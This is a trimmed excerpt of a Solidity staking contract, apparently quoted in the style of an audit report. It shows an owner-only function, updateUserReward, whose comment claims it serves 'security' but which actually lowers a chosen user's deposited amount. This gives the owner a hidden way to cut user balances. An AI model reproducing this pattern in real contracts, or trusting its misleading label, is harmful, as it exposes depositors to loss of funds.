...
contract Chef is Ownable, Pausable, Multicall, IERC677Receiver {
    ...
    constructor(IERC20 _rewardToken, address _rewardOwner, uint256 _rewardPerBlock) Ownable() Pausable() {
    ...
    /// @notice Update users reward for security
    /// @param pid The index of the pool. See `poolInfo`
    /// @param amount The amount of the user reward to be reduced
    ...
    function updateUserReward(uint256 pid, uint256 amount, address userAddress) external onlyOwner {
        ...
        require(user.amount >= amount, "!not enough amount");
        user.amount -= amount;
    }
